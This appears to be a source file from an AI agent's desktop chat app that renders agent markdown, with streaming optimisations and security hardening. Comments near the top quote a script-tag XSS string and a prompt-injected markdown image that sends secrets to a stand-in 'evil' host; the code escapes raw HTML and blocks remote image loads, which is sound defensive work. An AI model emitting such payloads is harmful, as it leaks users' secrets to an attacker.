// Markdown rendering with code block, mermaid, and graphviz support.

import { processCodeBlocks } from './markdown/code-blocks.js';
import { resetDiagramFailures } from './markdown/diagrams.js';
import { neutralizeLinks } from './link-handler.js';
import { isFullTexDocument, makeTablesSortable, parseDelimited } from './markdown/previews.js';
import {
    createTaskPlanElement,
    deduplicateTaskPlans,
    keepLastTaskPlan,
    parseTaskPlan,
} from './markdown/task-plan.js';

export { isFullTexDocument as _isFullTexDocument, parseDelimited as _parseDelimited };
export { createTaskPlanElement, parseTaskPlan };
export { keepLastTaskPlan as _keepLastTaskPlan };
export { resetDiagramFailures as _resetDiagramFailures };

// Escape raw HTML the agent emits inside markdown.
//
// marked passes raw HTML through verbatim by default. The pre-fix guard
// further down only catches the case where the *first* non-whitespace token
// is <script> / <html> / etc — anything later (e.g. "Here is the page:\n\n
// <script>alert(1)</script>") slipped through and ran inside the chat
// window. Override the renderer.html hook (used for both block-level and
// inline raw HTML tokens — see marked.umd.js cases at "html": in both the
// block parser and the inline parser) to escape every raw HTML token to
// plain text. Fenced code blocks (```html\n...\n```) are routed through
// renderer.code, not renderer.html, so source listings still render as
// syntax-highlighted code.
//
// We use a private DOM-based escape so we don't depend on import order
// during module init — keeps this file self-sufficient and avoids a
// circular import with tool-utils.js (which depends on this module).
export function _escapeHtmlForMarked(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
let _markedHardenedFlag = false;
/** Test-only: re-arm the hardening guard. Production code never calls this. */
export function _resetMarkedHardenedFlagForTests() {
    _markedHardenedFlag = false;
}
// Image sources that may load inline: data:image/*, blob:, and our own
// origin (bundled assets / relative paths). Anything else is remote.
function _isInlineSafeImageSrc(href) {
    if (/^data:image\//i.test(href) || /^blob:/i.test(href)) return true;
    try {
        // Compare scheme + host rather than `.origin`: for non-special
        // schemes (tauri://localhost on macOS/Linux) URL.origin is the
        // opaque "null", which would never match location.origin.
        const url = new URL(href, document.baseURI);
        return url.protocol === window.location.protocol && url.host === window.location.host;
    } catch {
        return false;
    }
}

// Agent markdown images must not auto-load remote URLs: with CSP null, a
// prompt-injected `![](https://evil/?d=<secrets>)` would exfiltrate data the
// moment the message renders, with no click. Remote images become a link
// (alt text + host) the user can choose to open in the browser. token.href
// is already resolved for reference-style images.
function _renderImageToken(token) {
    const href = token.href || '';
    if (_isInlineSafeImageSrc(href)) return false; // marked's default <img>
    let host = '';
    let remote = false;
    try {
        const url = new URL(href, document.baseURI);
        remote = url.protocol === 'http:' || url.protocol === 'https:';
        if (remote) host = url.host;
    } catch {
        /* unparseable — treat as non-remote text */
    }
    const alt = token.text || '';
    const label = alt && host ? `${alt} (${host})` : alt || host || href;
    if (!remote) return _escapeHtmlForMarked(label);
    const a = document.createElement('a');
    a.className = 'md-remote-image';
    a.setAttribute('href', href);
    a.title = href;
    a.textContent = label;
    return a.outerHTML;
}

export function hardenMarkedOnce() {
    if (_markedHardenedFlag) return;
    if (typeof marked === 'undefined' || !marked.use) return;
    marked.use({
        renderer: {
            html(token) {
                return _escapeHtmlForMarked(token.text || '');
            },
            image(token) {
                return _renderImageToken(token);
            },
        },
    });
    _markedHardenedFlag = true;
}
// Hardening must run before any marked.parse() call. Trying it now covers
// the common case (marked already loaded as a <script> tag); _doRender
// retries below as a safety net for the case where this module is imported
// before the marked vendor script has finished loading.
hardenMarkedOnce();

export function initMarkdown() {
    // mermaid + katex are now lazy-loaded on first encounter — nothing to do here
}

// Extension manager reference for message formatter hooks
let _extensionManager = null;

/**
 * Set the extension manager so message formatters can run after rendering.
 * @param {ExtensionManager} em
 */
export function setExtensionManager(em) {
    _extensionManager = em;
}

// --- Streaming-aware debounced rendering ---

const STREAMING_RENDER_INTERVAL = 150; // ms between renders during streaming
const _renderTimers = new WeakMap(); // targetElement → timer id
const _lastRenderTime = new WeakMap(); // targetElement → timestamp
const _pendingMarkdown = new WeakMap(); // targetElement → newest text awaiting the timer

// --- App icon inline rendering ---
// Replaces <app-icon name="processName"/> tags with inline icon images.
// Icons are fetched from the Rust side (cached by process name) and cached here.
const _appIconCache = new Map(); // process name → data URI or null
let _appIconInvoke = null;

/**
 * Set the invoke function for app icon lookups.
 * Call this once during init (same invoke used everywhere).
 */
export function setAppIconInvoke(invoke) {
    _appIconInvoke = invoke;
}

/**
 * Process <app-icon> tags in a rendered container, replacing them with inline images.
 * Uses regex on innerHTML since browsers don't reliably parse self-closing custom tags.
 * Async — fetches icons that aren't cached yet and updates the DOM when ready.
 */
function _processAppIcons(container) {
    if (!_appIconInvoke) return;
    const html = container.innerHTML;
    if (!html.includes('<app-icon')) return;

    // Replace all <app-icon name="..."/> or <app-icon name="..."></app-icon> with placeholders
    const pending = [];
    const replaced = html.replace(
        /<app-icon\s+name="([^"]+)"\s*\/?>(?:<\/app-icon>)?/gi,
        (_match, name) => {
            const key = name.toLowerCase();
            if (_appIconCache.has(key)) {
                const dataUri = _appIconCache.get(key);
                if (dataUri) {
                    const src = dataUri.startsWith('data:')
                        ? dataUri
                        : 'data:image/png;base64,' + dataUri;
                    return `<img src="${src}" alt="${name}" title="${name}" style="width:1.2em;height:1.2em;vertical-align:middle;border-radius:3px;margin:0 2px;">`;
                }
                return ''; // no icon available
            }
            // Not cached yet — insert an empty placeholder span and fetch async
            const id = `app-icon-${_appIconPlaceholderId++}`;
            pending.push({ id, name, key });
            return `<span id="${id}" style="display:inline-block;width:1.2em;height:1.2em;vertical-align:middle;"></span>`;
        }
    );

    if (replaced !== html) {
        container.innerHTML = replaced;
    }

    // Fetch uncached icons and replace placeholders
    for (const { id, name, key } of pending) {
        _appIconInvoke('get_app_icon', { processName: name })
            .then((dataUri) => {
                _appIconCache.set(key, dataUri || null);
                const placeholder = container.querySelector(`#${id}`);
                if (placeholder) {
                    if (dataUri) {
                        const src = dataUri.startsWith('data:')
                            ? dataUri
                            : 'data:image/png;base64,' + dataUri;
                        placeholder.outerHTML = `<img src="${src}" alt="${name}" title="${name}" style="width:1.2em;height:1.2em;vertical-align:middle;border-radius:3px;margin:0 2px;">`;
                    } else {
                        placeholder.outerHTML = ''; // no icon available
                    }
                }
            })
            .catch(() => {
                _appIconCache.set(key, null);
            });
    }
}

let _appIconPlaceholderId = 0;

// --- Incremental rendering state (per target element) ---
// During streaming, we split markdown into a "frozen prefix" (complete blocks
// that won't change) and an "active tail" (the last incomplete block).
// Only the tail is re-parsed on each chunk, turning O(n²) into ~O(n).
const _frozenHtml = new WeakMap(); // targetElement → rendered HTML string for frozen prefix
const _frozenMarkdown = new WeakMap(); // targetElement → the frozen markdown prefix itself

/**
 * Render markdown into a target element.
 * @param {string} markdown - raw markdown text
 * @param {HTMLElement} targetElement - DOM element to render into
 * @param {boolean} [streaming=false] - true while chunks are arriving; throttles
 *   rendering and skips expensive diagram/table work until complete
 */
export function renderMarkdown(markdown, targetElement, streaming = false) {
    if (!markdown) {
        _cancelPendingRender(targetElement);
        targetElement.innerHTML = '';
        _clearFrozenState(targetElement);
        return;
    }

    if (!streaming) {
        // Final render — cancel any pending debounce, clear incremental state, do full render
        _cancelPendingRender(targetElement);
        _clearFrozenState(targetElement);
        _doRender(markdown, targetElement, false);
        return;
    }

    // Streaming: throttle renders to at most one per STREAMING_RENDER_INTERVAL
    const now = Date.now();
    const last = _lastRenderTime.get(targetElement) || 0;
    const elapsed = now - last;

    if (elapsed >= STREAMING_RENDER_INTERVAL) {
        // Enough time has passed — render immediately
        _cancelPendingRender(targetElement);
        _doRender(markdown, targetElement, true);
    } else {
        // Always record the newest text: the pending timer must paint what
        // arrived last, not the snapshot from when it was scheduled (else a
        // long tool call after a burst shows text missing its final chunks).
        _pendingMarkdown.set(targetElement, markdown);
        // Schedule a render for when the interval expires (if not already scheduled)
        if (!_renderTimers.has(targetElement)) {
            const delay = STREAMING_RENDER_INTERVAL - elapsed;
            const timer = setTimeout(() => {
                _renderTimers.delete(targetElement);
                const latest = _pendingMarkdown.get(targetElement);
                _pendingMarkdown.delete(targetElement);
                if (latest) _doRender(latest, targetElement, true);
            }, delay);
            _renderTimers.set(targetElement, timer);
        }
    }
}

function _cancelPendingRender(targetElement) {
    const pending = _renderTimers.get(targetElement);
    if (pending) {
        clearTimeout(pending);
        _renderTimers.delete(targetElement);
    }
    _pendingMarkdown.delete(targetElement);
}

function _clearFrozenState(targetElement) {
    _frozenHtml.delete(targetElement);
    _frozenMarkdown.delete(targetElement);
}

function _doRender(markdown, targetElement, streaming) {
    _lastRenderTime.set(targetElement, Date.now());

    // Re-attempt the renderer.html override in case marked finished loading
    // after this module did. hardenMarkedOnce is idempotent — guarded by
    // a flag — so this is free if hardening already ran.
    hardenMarkedOnce();

    // Display nicety: if the response starts with a full HTML document
    // (<!DOCTYPE>, <html>, ...), wrap it in an html code fence so it
    // renders as a styled source listing instead of an ugly stream of
    // escaped tags. The renderer.html override above is the *security*
    // guarantee — this branch is just polish for the "agent pasted a
    // whole page" UX. Don't extend the trusted-input set here.
    if (typeof markdown === 'string') {
        const head = markdown.trimStart().slice(0, 200).toLowerCase();
        if (/^<(!doctype|html[\s>]|body[\s>]|head[\s>]|script[\s>]|style[\s>])/.test(head)) {
            markdown = '```html\n' + markdown + '\n```';
        }
    }

    // During streaming, if we detect an incomplete automation_plan block,
    // don't render it as raw code — the app's handleMessageChunk will render
    // the task list incrementally. Just show nothing for the plan portion.
    if (streaming && markdown.includes('```automation_plan')) {
        const completeBlock = /```automation_plan\s*\n[\s\S]*?\n```/.test(markdown);
        if (!completeBlock) {
            // Block is still being streamed — strip it and render any text
            // before it. Don't render anything for the incomplete block — the
            // app handles it.
            const beforeBlock = markdown.split('```automation_plan')[0].trimEnd();
            if (!beforeBlock.trim()) return;
            // Fall through to the normal incremental path (rather than a raw
            // innerHTML write) so links get neutralized, the frozen-prefix
            // cache stays coherent, and the other post-processing runs.
            markdown = beforeBlock;
        }
    }

    // Strip extension_tool_call fences from rendered output — they are handled
    // programmatically by the app and should never appear as visible code blocks.
    // Handle both complete and incomplete (still streaming) fences.
    if (markdown.includes('```extension_tool_call')) {
        // Strip complete fences
        markdown = markdown.replace(/```extension_tool_call\s*\n[\s\S]*?\n```/g, '');
        // Strip incomplete fence (still being streamed or tool executing)
        const incompleteIdx = markdown.indexOf('```extension_tool_call');
        if (incompleteIdx !== -1) {
            markdown = markdown.substring(0, incompleteIdx);
        }
        markdown = markdown.trim();
    }

    // Strip suggested_actions fences — rendered as clickable chips by the app, not as text.
    if (markdown.includes('```suggested_actions')) {
        markdown = markdown.replace(/```suggested_actions\s*\n[\s\S]*?\n```/g, '');
        // Also strip incomplete fence during streaming
        const incompleteIdx = markdown.indexOf('```suggested_actions');
        if (incompleteIdx !== -1) {
            markdown = markdown.substring(0, incompleteIdx);
        }
        markdown = markdown.trim();
    }

    // Deduplicate taskplan blocks at the source level — keep only the last one.
    // The agent re-outputs the full taskplan block each time it updates status,
    // so we strip all but the final occurrence to avoid showing stale versions.
    markdown = keepLastTaskPlan(markdown);

    // --- Incremental streaming render ---
    // Split into frozen prefix (complete blocks) and active tail (last block).
    // Only re-parse the tail; reuse cached HTML for the prefix.
    if (streaming) {
        const splitIdx = _findStableSplitPoint(markdown);
        const prefixMd = splitIdx > 0 ? markdown.substring(0, splitIdx) : '';
        const tailMd = splitIdx > 0 ? markdown.substring(splitIdx) : markdown;
        const prevFrozenMd = _frozenMarkdown.get(targetElement) || '';

        // Compare content, not length: keepLastTaskPlan and the fence
        // stripping above can rewrite earlier text, so a longer prefix is
        // not necessarily an extension of the old one.
        const frozenChanged = prefixMd !== prevFrozenMd;
        // Normal streaming growth — the old prefix is still a prefix. Parse
        // and process only the newly frozen slice and append it, instead of
        // re-parsing (and re-highlighting, re-building previews for) the
        // whole prefix at every paragraph. The slice starts at a top-level
        // blank line outside any fence. Cross-slice constructs (loose
        // lists, reference definitions) may render slightly differently
        // until the final non-streaming render re-parses everything.
        const canAppend =
            frozenChanged &&
            prevFrozenMd.length > 0 &&
            prefixMd.startsWith(prevFrozenMd) &&
            !!targetElement.querySelector(':scope > .markdown-frozen') &&
            !!targetElement.querySelector(':scope > .markdown-tail');

        // Prefix rewritten, shrank or first appeared — full rebuild
        if (frozenChanged && !canAppend) {
            // Preserve rendered diagrams from the frozen section before re-rendering
            const savedDiagrams = new Map();
            targetElement.querySelectorAll('.diagram-wrapper[data-rendered]').forEach((wrapper) => {
                const sourceEl = wrapper.querySelector('.diagram-source code');
                if (sourceEl) {
                    savedDiagrams.set(sourceEl.textContent, wrapper);
                    wrapper.remove();
                }
            });

            marked.setOptions({ breaks: true, gfm: true });
            const frozenRendered = prefixMd ? marked.parse(prefixMd) : '';
            _frozenHtml.set(targetElement, frozenRendered);
            _frozenMarkdown.set(targetElement, prefixMd);

            // Build frozen container (only if there's a prefix)
            const frozenDiv = prefixMd ? document.createElement('div') : null;
            if (frozenDiv) {
                frozenDiv.className = 'markdown-frozen';
                frozenDiv.innerHTML = frozenRendered;

                // Process code blocks in the newly frozen content
                processCodeBlocks(frozenDiv, true, savedDiagrams);
            }

            // Build tail container — preserve any diagrams from the previous tail
            const tailSavedDiagrams = new Map();
            const prevTail = targetElement.querySelector('.markdown-tail');
            if (prevTail) {
                prevTail.querySelectorAll('.diagram-wrapper').forEach((wrapper) => {
                    const sourceEl = wrapper.querySelector('.diagram-source code');
                    if (sourceEl) {
                        tailSavedDiagrams.set(sourceEl.textContent, wrapper);
                        wrapper.remove();
                    }
                });
            }
            // Rendered diagrams the frozen section didn't reuse (all of them
            // when the prefix vanished) go to the tail too — otherwise they'd
            // be discarded and re-rendered from scratch.
            for (const [code, wrapper] of savedDiagrams) {
                if (!tailSavedDiagrams.has(code)) tailSavedDiagrams.set(code, wrapper);
            }

            const tailDiv = document.createElement('div');
            tailDiv.className = 'markdown-tail';
            if (tailMd.trim()) {
                tailDiv.innerHTML = marked.parse(tailMd);
                processCodeBlocks(tailDiv, true, tailSavedDiagrams);
            }

            targetElement.innerHTML = '';
            if (frozenDiv) targetElement.appendChild(frozenDiv);
            targetElement.appendChild(tailDiv);
        } else {
            // Prefix unchanged (or only appended to) — only re-render the tail
            let tailDiv = targetElement.querySelector('.markdown-tail');
            if (!tailDiv) {
                // First render or structure mismatch — do a full incremental setup
                const savedDiagrams = new Map();
                targetElement
                    .querySelectorAll('.diagram-wrapper[data-rendered]')
                    .forEach((wrapper) => {
                        const sourceEl = wrapper.querySelector('.diagram-source code');
                        if (sourceEl) {
                            savedDiagrams.set(sourceEl.textContent, wrapper);
                            wrapper.remove();
                        }
                    });

                marked.setOptions({ breaks: true, gfm: true });

                if (prefixMd) {
                    const frozenRendered = _frozenHtml.get(targetElement) || marked.parse(prefixMd);
                    _frozenHtml.set(targetElement, frozenRendered);
                    _frozenMarkdown.set(targetElement, prefixMd);

                    const frozenDiv = document.createElement('div');
                    frozenDiv.className = 'markdown-frozen';
                    frozenDiv.innerHTML = frozenRendered;
                    processCodeBlocks(frozenDiv, true, savedDiagrams);

                    tailDiv = document.createElement('div');
                    tailDiv.className = 'markdown-tail';

                    targetElement.innerHTML = '';
                    targetElement.appendChild(frozenDiv);
                    targetElement.appendChild(tailDiv);
                } else {
                    tailDiv = document.createElement('div');
                    tailDiv.className = 'markdown-tail';
                    targetElement.innerHTML = '';
                    targetElement.appendChild(tailDiv);
                }
            }

            // Re-render only the tail — preserve any rendered diagrams first
            const tailSavedDiagrams = new Map();
            tailDiv.querySelectorAll('.diagram-wrapper[data-rendered]').forEach((wrapper) => {
                const sourceEl = wrapper.querySelector('.diagram-source code');
                if (sourceEl) {
                    tailSavedDiagrams.set(sourceEl.textContent, wrapper);
                    wrapper.remove();
                }
            });
            // Also save diagram wrappers that haven't fully rendered yet but have
            // a visible diagram-content (e.g. placeholder or partial render) — this
            // prevents the flash-to-code-block cycle during streaming.
            tailDiv.querySelectorAll('.diagram-wrapper:not([data-rendered])').forEach((wrapper) => {
                const sourceEl = wrapper.querySelector('.diagram-source code');
                if (sourceEl) {
                    tailSavedDiagrams.set(sourceEl.textContent, wrapper);
                    wrapper.remove();
                }
            });

            if (canAppend) {
                // The newly frozen blocks were the head of the old tail, so
                // they reuse the tail's saved diagram wrappers.
                marked.setOptions({ breaks: true, gfm: true });
                const sliceHtml = marked.parse(prefixMd.slice(prevFrozenMd.length));
                const sliceDiv = document.createElement('div');
                sliceDiv.innerHTML = sliceHtml;
                processCodeBlocks(sliceDiv, true, tailSavedDiagrams);
                targetElement
                    .querySelector(':scope > .markdown-frozen')
                    .append(...sliceDiv.childNodes);
                _frozenHtml.set(targetElement, (_frozenHtml.get(targetElement) || '') + sliceHtml);
                _frozenMarkdown.set(targetElement, prefixMd);
            }

            if (tailMd.trim()) {
                marked.setOptions({ breaks: true, gfm: true });
                tailDiv.innerHTML = marked.parse(tailMd);
                processCodeBlocks(tailDiv, true, tailSavedDiagrams);
            } else {
                tailDiv.innerHTML = '';
            }
        }

        // Process app-icon tags. Gate on the source so the common case
        // doesn't serialize the whole message's innerHTML every render.
        if (markdown.includes('app-icon')) _processAppIcons(targetElement);

        // Strip navigable hrefs so WebView2 can't open links itself (in
        // addition to our click handler). See neutralizeLinks.
        neutralizeLinks(targetElement);

        // Deduplicate taskplan blocks
        deduplicateTaskPlans(targetElement);

        // Run extension message formatters
        if (_extensionManager) {
            _extensionManager.formatMessage(targetElement, { streaming });
        }
        return;
    }

    // --- Full (non-streaming) render ---
    // During streaming, preserve successfully rendered diagrams so they don't
    // flash back to source code when innerHTML is replaced.  Key by source text.
    const savedDiagrams = new Map(); // code text → DOM wrapper element

    marked.setOptions({ breaks: true, gfm: true });
    targetElement.innerHTML = marked.parse(markdown);

    processCodeBlocks(targetElement, false, savedDiagrams);

    // Only wire up sortable tables on the final render
    resetDiagramFailures();
    makeTablesSortable(targetElement);

    // Process app-icon tags
    if (markdown.includes('app-icon')) _processAppIcons(targetElement);

    // Strip navigable hrefs so WebView2 can't open links itself (in addition
    // to our click handler). See neutralizeLinks.
    neutralizeLinks(targetElement);

    // Deduplicate taskplan blocks — keep only the last one (most up-to-date)
    deduplicateTaskPlans(targetElement);

    // Run extension message formatters
    if (_extensionManager) {
        _extensionManager.formatMessage(targetElement, { streaming });
    }
}

/**
 * Find the last safe split point in markdown where we can freeze the prefix.
 * A safe split is a double-newline (\n\n) that is NOT inside a code fence
 * and leaves a tail of at least 50 chars. Returns the index right after the
 * \n\n, or 0 if no safe split qualifies.
 *
 * Falling back to an earlier qualifying split (rather than returning 0 when
 * the latest one is too close to the end) keeps the frozen prefix from
 * collapsing at the start of every new paragraph — that collapse forced two
 * full rebuilds per paragraph and re-rendered every diagram.
 *
 * Exported (with underscore prefix to preserve "private" intent) so the
 * incremental streaming logic can be exercised in isolation — this is the
 * function the 2026-04 OOM regression touched. The underscore signals
 * "implementation detail, don't import elsewhere".
 */
export function _findStableSplitPoint(markdown) {
    // Open fence as { ch, len, indent }, or null. Fences may be indented
    // (agents nest them in list items) and use ``` or ~~~; only a bare run
    // of the same char, at least as long and indented less than 4 columns
    // past the opener, closes one (deeper lines are fence content).
    let fence = null;
    let lastSafeSplit = 0;

    // Scan for code fences and double-newlines
    let i = 0;
    while (i < markdown.length) {
        if (i === 0 || markdown[i - 1] === '\n') {
            let end = markdown.indexOf('\n', i);
            if (end === -1) end = markdown.length;
            const m = /^([ \t]*)(`{3,}|~{3,})(.*)$/.exec(markdown.slice(i, end));
            if (m) {
                const indent = m[1].length;
                const ch = m[2][0];
                const len = m[2].length;
                if (!fence) {
                    // A backtick info string can't contain a backtick
                    // (CommonMark) — "```foo```" is an inline code span.
                    if (ch !== '`' || !m[3].includes('`')) fence = { ch, len, indent };
                } else if (
                    ch === fence.ch &&
                    len >= fence.len &&
                    !m[3].trim() &&
                    indent < fence.indent + 4
                ) {
                    fence = null;
                }
                // Skip to end of line
                i = end;
                continue;
            }
        }

        // Check for double-newline outside of fences. Don't freeze if the
        // split is too close to the end — not worth it.
        if (!fence && markdown[i] === '\n' && markdown[i + 1] === '\n') {
            if (markdown.length - (i + 2) >= 50) lastSafeSplit = i + 2;
            i += 2;
            continue;
        }

        i++;
    }

    return lastSafeSplit;
}

/**
 * Highlight a code block with the given language. If the Prism component
 * for that language isn't loaded yet, kicks off the load and reapplies
 * highlight to the same node when it arrives. Mid-load the block stays
 * unhighlighted (plain text), which is fine — Prism's highlighting is
 * cosmetic and we'd rather render the response immediately than block
 * on a fetch.
 *
 * Used to be: 15 language packs eagerly loaded at every window startup
 * via `<script defer>` tags. Now only `prism.js` core is eager; each
 * pack loads on first use of its language.
 */
